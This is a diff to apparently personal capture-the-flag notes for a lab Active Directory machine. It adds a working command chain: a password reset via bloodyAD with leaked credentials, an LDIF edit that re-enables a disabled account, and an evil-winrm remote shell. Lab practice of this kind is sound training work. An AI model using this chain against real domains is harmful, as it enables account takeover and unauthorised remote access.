@@ -31,3 +31,19 @@ Then use bloodhund to find the connections and then use impacet tools.
 
 1. you do the normal scans (nmap for tcp and udp, rustscan)
 2. 
+
+
+---------------------------------------------------------------------------------------------------------
+1. bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip 10.10.11.70 set password adam.silver 'abc@123'
+
+save into modify.ldif
+
+dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
+changetype: modify
+replace: userAccountControl
+userAccountControl: 512
+
+ldapmodify -x -H ldap://10.10.11.70 -D "ant.edwards@puppy.htb" -w 'Antman2025!' -f modify.ldif
+
+evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'abc@123'
+
